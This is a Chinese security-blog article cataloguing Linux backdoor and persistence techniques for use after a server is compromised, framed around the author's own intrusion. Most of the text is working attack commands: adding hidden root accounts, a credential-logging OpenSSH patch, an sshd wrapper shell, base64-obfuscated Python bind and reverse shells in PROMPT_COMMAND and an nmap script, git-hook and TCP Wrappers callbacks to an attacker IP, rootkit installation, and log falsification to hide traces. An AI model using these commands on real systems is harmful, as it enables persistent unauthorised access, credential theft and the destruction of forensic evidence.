# 我所了解的渗透测试——Linux后门类型

阅读量 **623819**

|评论 **10**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-08-13 15:38:29

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01c5929ebb5afa7cd0.jpg)

在一次渗透中，成功获取某目标几台比较重要的机器，当时只想着获取脱库，结果动静太大被发现了，之前渗透并没太在意Linux维持权限，经过此次事后从Google找各种资料，一款满意的rootkit都没有，现在一直在关注这方面，但还是没有找到满意的后门，在渗透圈一个人的资源总是有限往往你全力追求的，也不过是别人的一层关系就可以解决得到更有力的资源。

**常用后门技术**

  * 增加超级用户帐号
  * 破解/嗅控用户密码
  * 放置SUID Shell _**_
  * 利用系统服务程序
  * TCP/UDP/ICMP Shell
  * Crontab定时任务
  * 共享库文件
  * 工具包rootkit
  * 可装载内枋模块(LKM)

## 增加超级用户

`echo "mx7krshell:x:0:0::/:/bin/sh" >> /etc/passwd`

如果系统不允许uid=0的用户远程登录，可以增加一个普通用户账号  
`echo "mx7krshell::-1:-1:-1:-1:-1:-1:500" >> /etc/shadow`

###  小案例

搞某外企，主站拿不下来进行C段渗透，发现某个业务系统存在Struts2漏洞。  
Struts漏洞工具执行命令有些交互式没有办法回显，所以通过无密码添加密码来连接SSH：

    
    
    useradd seradd -u 0 -o -g root -G roo1
    echo "123456" | passwd --stdin roo1   #有些环境中并不能成功
    

跑去登录发现拒绝访问，查看了下`/etc/shadow`并没有修改成功密码，这时候我考虑了可能设置了密码策略，所以我添加了一个14位，大小写加特殊字符的，还是无法登录，没有办法修改成功,因为无法回显并不知道错误信息，所以试了几个添加密码的方法。

`echo "roo1:password" |chpasswd`  
修改密码失败

    
    
    echo "123456n123456" |(sudo passwd roo1)
    #有些情况下是可以成功的一条命令
    

试了几种方法都没有修改成密码，最后无回显添加Linux密码一种方法：  
而这种方法是可以绕过密码强速限制添加的。

    
    
    /usr/sbin/useradd -u 0 -o -g root -G root -d /home/mx7krshell mx7krshell -p $1$F1B0hFxb$NkzreGE7srRJ**/
    

果然成功了， **后来上服务器** 用passwd修改密码，提示  

是之前写的密码太简单了，而服务器有密码策略，然后用`mkpasswd`自动生成的密码修改尝试 NW8JLHV6m _*_ ug，成功了。

其实这条也是可以成功的，需要密码强度。

    
    
    useradd -u 0 -o -g root -G root  user2  |echo -e "1qaz2wsxn1qaz2wsx"|passwd user1
    

## 破解

获得shadow文件后，用`John the Ripper`工具破解薄弱的用户密码，根据我所使用的情况下只能破解一些简单常用密码其它密码很难跑出来。

除此之外可以使用`hashcat`GPU、或者分布式服务器来进行破解  
这里给出之前同事在本地装的一台配置，价格好像也就3万多:

`supermicro超微7048GR-TR准系统 双路塔式工作站4 GPU运算服务器 |一台`  
`Intel/英特尔 XEON至强 E5-2620 V3 15M 2.4G 6核12 |2颗`  
`金士顿 16G DDR4 REG ECC 2133 服务器内存条 |2根`  
`三星(SAMSUNG) 850 PRO 512G SATA3 固态硬盘|2块`  
`NVIDIA技嘉GTX1070 Founders Edition 8G| 4张 32G GPU`  
对于跑Windows密码还是非常快，而遇到Linux加密算法是非常蛋疼，如有需要可以贴出来搭建GPU破解服务器文章。

## 放置SUID Shell

(测试失败):bash2针对suid做了一些护卫措施  
普通用户在本机运行/dev/.rootshell，即可获得一个root权限的shell。

    
    
    cp /bin/bash /dev/.rootshell
    chmod u+s /dev/.rootshell
    

## Crontab后门

(容易被发现)

crontab命令被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。

在Redis未授权访问中可以利用此方法获取Shell。

    
    
    (crontab -l;printf "*/5 * * * * exec9<> /dev/tcp/localhost/8080&&exec0<&9&&exec1>&92>&1&&/bin/bash --noprofile –I;rno crontab for `whoami`%100cn")|crontab –
    

## ssh 公钥免密

(容易被发现)

    
    
    ssh-keygen -t rsa
    

把`id_rsa.pub`写入服务端的`authorized_keys`中

    
    
    chmod 600 ~/.ssh/authorized_keys
    chmod 700 ~/.ssh
    

## alias 后门

当前用户目录下`.bashrc`

    
    
    alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'
    

## pam 后门 or openssh

参考：  
关于openssh通用后门的拓展  
<http://0cx.cc/ssh_get_password.jspx>

    
    
    wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
    wget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
    tar zxvf openssh-5.9p1.tar.gz
    tar zxvf 0x06-openssh-5.9p1.patch.tar.gz
    cd openssh-5.9p1.patch/
    cp sshbd5.9p1.diff ../openssh-5.9p1
    cd ../openssh-5.9p1
    patch < sshbd5.9p1.diff   //patch  后门
    

vi includes.h //修改后门密码，记录文件位置，

/ _  
+#define ILOG “/tmp/ilog” //记录登录到本机的用户名和密码  
+#define OLOG “/tmp/olog” //记录本机登录到远程的用户名和密码  
+#define SECRETPW “123456654321” //你后门的密码  
_/

    
    
    yum install -y openssl openssl-devel pam-devel
    ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
    
    yum install -y zlib zlib-devel
    make && make install
    service sshd restart          //重启sshd
    

Centos6可以使用后门，但是配合curl把登录密码发送到服务器失败

## SSH后门

`ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337`  
执行完之后，任何一台机器`ssh root[@IP](https://github.com/IP "@IP") -p 31337`不需要密码

## SSH wrapper后门简介

init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。

    
    
    cd /usr/sbin/
    mv sshd ../bin/
    echo '#!/usr/bin/perl' >sshd
    echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd
    echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
    chmod u+x sshd
    /etc/init.d/sshd restart
    

连接：  
`socat STDIO TCP4:target_ip:22,sourceport=13377`  
默认端口为13377否则会出现：  

## mafix rootkit

Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现让攻击者远程登陆的，特点是配置简单并可以自定义验证密码和端口号。

不知道我测试是否有问题很多系统不被支持  

## 利用系统服务程序

修改`/etc/inetd.conf`  
`daytime stream tcp nowait /bin/sh sh –I`

用`trojan`程序替换`in.telnetd、in.rexecd`等 inted的服务程序重定向login程序

## TCP/UDP/ICMP Shell

Ping Backdoor，通过ICMP包激活后门， 形成一个Shell通道。  
TCP ACK数据包后门，能够穿越防火墙。

Linux下的icmp shell后门 容易被发现  
<http://prdownloads.sourceforge.net/icmpshell/ish-v0.2.tar.gz>

被控端  
`./ishd -i 65535 -t 0 -p 1024 -d`

控制端  
`./ish -i 65535 -t 0 -p 1024 192.168.1.69`  

这个是py版的  
<https://github.com/inquisb/icmpsh/blob/master/icmpsh_m.py>

Linux下ICMP后门PRISM  
使用这种模式的后门将会在后台等待特定的包含主机/端口连接信息的ICMP数据包，通过私有密钥可以阻止第三方访问。后门进程接受ping包激活。

编译安装:  
`gcc <..OPTIONS..> -Wall -s -o prism prism.c`

-DDETACH #后台运行

-DSTATIC #开启STATIC模式 (默认ICMP模式)

-DNORENAME #不使用自定义的进程名

-DIPTABLES #清空所有的iptables规则

用的是单台机器测试所以2个IP一样：  
`sendPacket.py 内机 FUCK 控制端 19832`  

测试感觉还行，不知道在真实环境下能否维持多久。

参考  
<http://vinc.top/2016/09/28/linux%E4%B8%8Bicmp%E5%90%8E%E9%97%A8prism/>

其它文章：

[ping这个命令会有危害么？有么？](https://bbs.pediy.com/thread-218557.htm?source=1)

## 共享库文件

在共享库中嵌入后门函数  
使用后门口令激活Shell，获得权限  
能够躲避系统管理员对二进制文件本身的 校验

## 可装载内核模块(LKM)

LKM:Loadable Kernel Modules  
动态的加载，不需要重新编译内核。  
截获系统调用，具有隐藏目录、文件、进 程、网络连接等强大功能。  
自身隐蔽性好，发现难度较大。  
著名的LKM包有adore和knark。

内核级rootkit Kbeast的安装与使用  
支持的内核版本有2.6.16, 2.6.18, 2.6.32, and 2.6.35。

wget <http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz>

config.h配置密码等  

安装`./setup build`  

守护进程的PID是1747

隐藏目录:  

通过命令是无法查看开放端口的  

ps aux命令也是无法查看到进程，除非指定进程名称，我们把后门进程名称伪靠系统服务也是可以让管理员头疼。

而通过nmap全端口扫描出现了13377后门端口，通过telnet连接  

使用总结：  
隐藏进程、隐藏端口  
支持版本太少、重启将失效。

<http://vinc.top/2016/06/07/%E5%86%85%E6%A0%B8%E7%BA%A7rootkit-kbeast%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/>

## 隐藏文件

Linux/Unix 藏文件和文件夹  
Linux/Unix 下想藏 Webshell 或者后门什么的，可以利用一下隐藏文件夹和文件。

方法一  
比如创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。（查看方法：ls -a）  
touch .webshell.php 创建名字为 .webshell.php 的文件  
mkdir .backdoor/ 创建名字为 .backdoor 的文件夹

终极方法  
在管理员喝多了或者脑子转不过来的情况下，是绝对不会发现的！至少我用了这么久是没几个发现的。  
是文件的话浏览器访问直接输 … 就行，目录同理。  
touch … 创建名字为 … 的文件  
mkdir … 创建名字为 … 的文件夹

## Git hooks

原是XTERM反弹Shell，老外与Git结合

`echo "xterm -display <attacker IP>:1 &" > .git/hooks/pre-commit`  
`chmod +x .git/hooks/pre-commit`

`Xnest:1`

当更新git的时候会触发:

`git commit -am "Test"`

## PROMPT_COMMAND后门

bash提供了一个环境变量`PROMPT_COMMAND`,这个变量会在你执行命令前执行一遍。

一般运维人员都将用来记录每个用户执行命令的时间ip等信息。  
每执行一个命令之前都会调用这个变量将你操作的命令记录下来。

    
    
    export PROMPT_COMMAND='{ date "+[ %Y%m%d %H:%M:%S `whoami` ] `history 1 | { read x cmd; echo "$cmd      from ip:$SSH_CLIENT   $SSH_TTY"; }`"; }&gt;&gt; /home/pu/login.log'
    

但是在安全人员手里味道变得不一样了

`export PROMPT_COMMAND="lsof -i:1025 &>/dev/null || (python -c
"exec('aW1wb3J0IHNvY2tldCxvcyxzeXMKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgiIiwxMDI1KSkKcy5saXN0ZW4oMSkKKGMsYSk9cy5hY2NlcHQoKQp3aGlsZSAxOgogZD1jLnJlY3YoNTEyKQogaWYgJ2V4aXQnIGluIGQ6CiAgcy5jbG9zZSgpCiAgc3lzLmV4aXQoMCkKIHI9b3MucG9wZW4oZCkucmVhZCgpCiBjLnNlbmQocikK'.decode('base64'))"
2>/dev/null &)"`  
Base64解密:

    
    
    import socket,os,sys
    s=socket.socket()
    s.bind(("",1025))
    s.listen(1)
    (c,a)=s.accept()
    while 1:
     d=c.recv(512)
     if 'exit' in d:
      s.close()
      sys.exit(0)
     r=os.popen(d).read()
     c.send(r)
    

一段简单的python socks监听命令  

NC连接  
`nc 192.168.1.174 1025`  

## PROMPT_COMMAND提权

这个只是留做后门,有些黑客则是利用这点来进行提权。  
这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户

`export PROMPT_COMMAND="/usr/sbin/useradd -o -u 0 hack &>/dev/null && echo
hacker:123456 | /usr/sbin/chpasswd &>/dev/null && unset PROMPT_COMMAND"`

除此之外可以利用script记录某人行为:  
基本用法:

`script -t 2>demo.time -a demo.his` 记录保存为录像  
`scriptreplay demo.time demo.his` 播放记录

用户家目录下,修改环境变量，使得用户登录就会触发录像

    
    
    vi ~/.profile
    script -t -f -q 2>/wow/$USER-$UID-`date +%Y%m%d%H%M%S`.time -a /wow/$USER-$UID-`date +%Y%m%d%H%M%S`.his
    

## Sudoers “trick”

其实Sudoers并不算后门,是一个Linux用户控制权限  
通过root权限改写对普通用户可执行root命令

    
    
    sudo su -c "echo 'mx7krshell ALL = NOPASSWD: ALL' >> /etc/sudoers.d/README"
    

`授权用户/组 主机=[(切换到哪些用户或组)] [是否需要输入密码验证] 命令1,命令2,...`  

更详细文章参考:  
<https://segmentfault.com/a/1190000007394449>

## TCP Wrappers

TCP_Wrappers是一个工作在应用层的安全工具，它只能针对某些具体的应用或者服务起到一定的防护作用。比如说ssh、telnet、FTP等服务的请求，都会先受到TCP_Wrappers的拦截。

TCP_Wrappers有一个TCP的守护进程叫作tcpd。以telnet为例，每当有telnet的连接请求时，tcpd即会截获请求，先读取系统管理员所设置的访问控制文件，合乎要求，则会把这次连接原封不动的转给真正的telnet进程，由telnet完成后续工作；如果这次连接发起的ip不符合访问控制文件中的设置，则会中断连接请求，拒绝提供telnet服务。

`ALL: ALL: spawn (bash -c "/bin/bash -i >& /dev/tcp/<Attack IP>/443 0>&1") &
:allow`  
ssh访问目标主机`ssh [qweqwe@192.168.4](mailto:qweqwe@192.168.4).100`触发后门  

## nmap nse后门

很多linux系统中默认都安装了nmap

    
    
    mkdir -p ~/.nmap/scripts/
    cd ~/.nmap/scripts/
    curl -O 'https://raw.githubusercontent.com/ulissescastro/linux-native-backdoors/master/nmap/http-title.nse'
    
    
    
      local payload = "ZWNobyAiKi8xICogKiAqICogcHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzJodmMzUTlKekV5Tnk0d0xqQXVNU2M3Y0c5eWREMDBORE03Y3oxemIyTnJaWFF1YzI5amEyVjBLSE52WTJ0bGRDNUJSbDlKVGtWVUxITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTazdjeTVqYjI1dVpXTjBLQ2hvYjNOMExIQnZjblFwS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdiM011WkhWd01paHpMbVpwYkdWdWJ5Z3BMREVwTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eUtUdHdQWE4xWW5CeWIyTmxjM011WTJGc2JDaGJKeTlpYVc0dlltRnphQ2NzSUNjdGFTZGRLVHNLJy5kZWNvZGUoJ2Jhc2U2NCcpKVwiIiB8IGNyb250YWI="
    

base64解密

    
    
    echo "*/1 * * * * python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO2hvc3Q9JzEyNy4wLjAuMSc7cG9ydD00NDM7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KChob3N0LHBvcnQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbJy9iaW4vYmFzaCcsICctaSddKTsK'.decode('base64'))"" | crontab#
    

解密

    
    
    import socket,subprocess,os;host='127.0.0.1';port=443;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash', '-i']);
    

可以将127.0.0.1改成你的地址  

## 进程注入

cymothoa进程注入后门

./cymothoa -p 1014 -s 0 -y 8888  

只能连接一次后就失效没啥用。  
<https://github.com/jorik041/cymothoa>

## 清理

bash去掉history记录

`export HISTSIZE=0  
export HISTFILE=/dev/null`

## 修改上传文件时间戳

touch -r 老文件时间戳 新文件时间戳

## 伪造Apache日志中的指定IP

sed –i ‘s/192.168.1.3/192.168.1.4/g’ /var/log/apache/ access.log  
sed –i ‘s/192.168.1.3/192.168.1.4/g’ /var/log/apache/error_log

## Linux日志清除

首先是Apache日志，Apache主要的日志就是`access.log``error_log`，前者记录了HTTTP的访问记录，后者记录了服务器的错误日志。根据Linux的配置不同和Apache的版本的不同，文件的放置位置也是不同的，不过这些都可以在httpd.conf中找到。

对于明文的Apache文件，通过正则表达式就可以搞定：  
`sed –i 's/192.168.1.3/192.168.1.4/g' /var/log/apache/ access.log  
sed –i 's/192.168.1.3/192.168.1.4/g' /var/log/apache/error_log`  
其中192.168.1.3是我们的IP，192.168.1.4使我们伪造的IP。  
在正则表达式中有特殊的含义，所以需要用“”来进行转义。

MySQL日志文件  
`log-error=/var/log/mysql/mysql_error.log` #错误日志  
`log=/var/log/mysql/mysql.log`#最好注释掉，会产生大量的日志，包括每一个执行的sql及环境变量的改变等等  
`log-bin=/var/log/mysql/mysql_bin.log` # 用于备份恢复，或主从复制.这里不涉及。  
`log-slow-queries=/var/log/mysql/mysql_slow.log` #慢查询日志  
`log-error=/var/log/mysql/mysqld.log`  
`pid-file=/var/run/mysqld/mysqld.pid`

`sed –i 's/192.168.1.3/192.168.1.4/g'  
/var/log/mysql/mysql_slow.log`

至于二进制日志文件，需要登录mysql client来修改删除，建议这种操作最先执行。

php日志修改  
`sed –i 's/192.168.1.3/192.168.1.4/g'  
/var/log/apache/php_error.log`  
最后就是Linux的日志文件了，这个比较多，记录的也比较复杂，我的环境是CentOS
6.3。我现在只把和渗透有关的文件列出来，主要在`/etc/logrotate.d/syslog`中

`/var/log/maillog`，该日志文件记录了每一个发送到系统或从系统发出的电子邮件的活动，它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统

`var/log/messages`，该文件的格式是每一行包含日期、主机名、程序名，后面是包含PID或内核标识的方括号，一个冒号和一个空格

`/var/log/wtmp`，该日志文件永久记录每个用户登录、注销及系统的启动，停机的事件。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前显示用户的登录记录，last也能根据用户，终端tty或时间显示相应的记录

`/var/run/utmp`，该日志文件记录有关当前登录的每个用户的信息，因此这个文件会随着用户登录和注销系统而不断变化，它只保留当时联机的用户记录，不会为用户保留永久的记录。系统中需要查询当前用户状态的程序，如who、w、users、finger等就需要访问这个文件

`/var/log/xferlog`，该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件。该文件会显示用户拷贝到服务器上的用来入侵服务器的恶意程序，以及该用户拷贝了哪些文件供他使用。

`bash_history`，这是bash终端的命令记录，能够记录1000条最近执行过的命令（具体多少条可以配置），通过这个文件可以分析此前执行的命令来知道知否有入侵者，每一个用户的home目录里都有这么一个文件

清除脚本:  
<https://github.com/JonGates/jon>

之前记录的笔记反过来看Linux后门的各种类型也算是比较全面了,最后我还是没有找到中意的后门，商业的又买不起，自己又不会写，转行了转行了搞毛渗透。

参考链接:  
<https://www.slideshare.net/ulissescastro/50-ton-of-backdoors?from_action=save>  
linux一种无文件后门技巧(译文)  
<https://kevien.github.io/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7(%E8%AF%91%E6%96%87)/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **mx7krshell** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/155943](/post/id/155943)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [linux](/tag/linux)
  * [渗透测试](/tag/渗透测试)
  * [系统安全](/tag/系统安全)

 **+1** __29赞

 __收藏

![](https://wx.qlogo.cn/mmopen/vi_32/tzg4JOb3iaibZiaFt2uRxgeDxOwDmdKa8QNm0rNHiavODXolw8WibnLgWC4I1sbncic6FY39ydOkWKgjbToWQTkmXXPg/0)
mx7krshell

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

